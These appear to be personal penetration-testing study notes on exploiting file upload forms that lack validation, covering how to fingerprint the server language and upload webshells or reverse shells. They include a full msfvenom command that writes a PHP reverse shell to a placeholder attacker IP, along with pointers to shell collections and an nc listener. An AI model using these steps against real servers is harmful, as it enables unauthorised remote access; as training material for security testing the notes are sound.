## Absent Validation
- upload any type of file
- usually we use a webshell or a reverse shell to test this
- For webshell:
	- we need to upload/write a webshell in the same language.
	- we can know the language from the file extension.
- When the web framework is using routes, the extension is not seen
	- file upload exploitation would also be different, as our uploaded files may not be directly routable or accessible.
	- determine what language runs the web application is to visit the `/index.ext` page, where we would swap out `ext` with various common web extensions, like `php`, `asp`, `aspx`, among others, to see whether any of them exist.
	- we can use burp fuzzing using this wordlist - https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
	- not always accurate
	- We can also use https://www.wappalyzer.com/

## Upload Exploitation
- use seclists/web0shells
- `phpbash.php`
- Custom webshells using GET
- Reverse shells:
	- https://github.com/pentestmonkey/php-reverse-shell
	- SecLists
	- Change IP/port
	- start nc server on our attackbox
- Custom Reverse Shells
	- `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`
